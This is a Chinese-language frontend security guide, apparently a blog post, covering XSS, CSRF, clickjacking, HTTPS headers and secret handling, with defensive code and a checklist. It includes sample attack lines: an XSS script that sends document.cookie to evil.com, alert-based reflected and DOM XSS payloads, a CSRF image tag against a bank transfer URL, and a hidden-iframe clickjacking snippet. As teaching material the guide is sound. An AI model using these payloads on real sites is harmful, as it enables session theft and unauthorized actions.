---
slug: frontend-security
title: 前端安全实践指南
authors: mason
tags: [安全, 前端, XSS, CSRF]
---

前端安全是 Web 开发中不可忽视的重要环节。本文总结常见的安全威胁和防护措施。

<!--truncate-->

## 🎯 常见安全威胁

| 威胁 | 说明 | 危害等级 |
|------|------|---------|
| XSS | 跨站脚本攻击 | 🔴 高 |
| CSRF | 跨站请求伪造 | 🔴 高 |
| 点击劫持 | 透明 iframe 覆盖 | 🟡 中 |
| 中间人攻击 | 拦截/篡改通信 | 🔴 高 |
| 敏感信息泄露 | 前端暴露密钥等 | 🟡 中 |

---

## 🛡️ XSS 跨站脚本攻击

### 攻击类型

**1. 存储型 XSS**
```javascript
// 用户提交恶意内容，存入数据库
// 其他用户访问时执行
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

**2. 反射型 XSS**
```javascript
// 恶意链接
https://example.com/search?q=<script>alert('XSS')</script>
```

**3. DOM 型 XSS**
```javascript
// 直接操作 DOM，不经过服务器
document.getElementById('output').innerHTML = location.hash.slice(1);
// URL: https://example.com/#<img src=x onerror=alert('XSS')>
```

### 防护措施

**1. 输出编码**

```javascript
// ❌ 危险
element.innerHTML = userInput;

// ✅ 安全 - 使用 textContent
element.textContent = userInput;

// ✅ 安全 - HTML 编码
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}
```

**2. CSP 内容安全策略**

```html
<!-- HTTP Header -->
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-随机值'

<!-- Meta 标签 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

**3. HttpOnly Cookie**

```javascript
// 服务端设置
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

**4. 框架自动转义**

```jsx
// React 自动转义
<div>{userInput}</div>  // 安全

// ❌ 危险 - 绕过转义
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

---

## 🔐 CSRF 跨站请求伪造

### 攻击原理

```html
<!-- 恶意网站 evil.com -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">

<!-- 用户已登录 bank.com，Cookie 自动携带 -->
```

### 防护措施

**1. CSRF Token**

```html
<!-- 表单中包含 Token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="随机Token">
  <!-- 其他字段 -->
</form>
```

```javascript
// Fetch 请求携带 Token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCsrfToken()
  },
  body: JSON.stringify(data)
});
```

**2. SameSite Cookie**

```javascript
// 服务端设置
Set-Cookie: session=abc; SameSite=Strict  // 最严格
Set-Cookie: session=abc; SameSite=Lax     // 允许导航请求
```

**3. 验证 Referer/Origin**

```javascript
// 服务端验证请求来源
if (request.headers.origin !== 'https://example.com') {
  return response.status(403).send('Forbidden');
}
```

---

## 🖼️ 点击劫持

### 攻击原理

```html
<!-- 透明 iframe 覆盖在按钮上 -->
<iframe src="https://bank.com/transfer" 
        style="opacity: 0; position: absolute;">
</iframe>
<button>点击领取奖品</button>
```

### 防护措施

**1. X-Frame-Options**

```http
X-Frame-Options: DENY           # 禁止所有 iframe
X-Frame-Options: SAMEORIGIN     # 只允许同源
```

**2. CSP frame-ancestors**

```http
Content-Security-Policy: frame-ancestors 'self'
```

**3. JavaScript 检测**

```javascript
// 检测是否被嵌入 iframe
if (window.top !== window.self) {
  window.top.location = window.self.location;
}
```

---

## 🔒 HTTPS 与传输安全

### 强制 HTTPS

```javascript
// 服务端重定向
if (req.protocol !== 'https') {
  res.redirect(`https://${req.host}${req.url}`);
}
```

### HSTS 头

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

### 安全头配置

```http
# 推荐的安全响应头
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=()
```

---

## 🔑 敏感信息保护

### 不要在前端存储

```javascript
// ❌ 危险
const API_KEY = 'sk-xxxxxxxxxxxxx';
localStorage.setItem('password', userPassword);

// ✅ 敏感操作放到后端
```

### 环境变量

```javascript
// ❌ 会打包到前端
const key = process.env.SECRET_KEY;

// ✅ 使用公开前缀
const key = process.env.NEXT_PUBLIC_API_KEY; // 只放公开信息
```

### 代码混淆

```javascript
// 生产环境代码混淆
// 但记住：混淆不是加密，仍可被逆向
```

---

## 📋 安全检查清单

### 开发阶段

- [ ] 所有用户输入都进行验证和转义
- [ ] 使用 HTTPS
- [ ] 实现 CSRF 防护
- [ ] 配置安全响应头
- [ ] 不在前端存储敏感信息
- [ ] 使用 HttpOnly、Secure Cookie

### 部署阶段

- [ ] 启用 CSP
- [ ] 配置 HSTS
- [ ] 禁用不必要的 HTTP 方法
- [ ] 定期更新依赖
- [ ] 进行安全扫描

### 推荐工具

| 工具 | 用途 |
|------|------|
| [OWASP ZAP](https://www.zaproxy.org/) | 安全扫描 |
| [Snyk](https://snyk.io/) | 依赖漏洞检测 |
| [SecurityHeaders](https://securityheaders.com/) | 响应头检测 |
| [Helmet.js](https://helmetjs.github.io/) | Express 安全中间件 |

---

## 📚 推荐资源

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Google Web Security](https://web.dev/security/)

---

安全是一个持续的过程，而不是一次性的任务。保持警惕，定期审查代码和依赖。
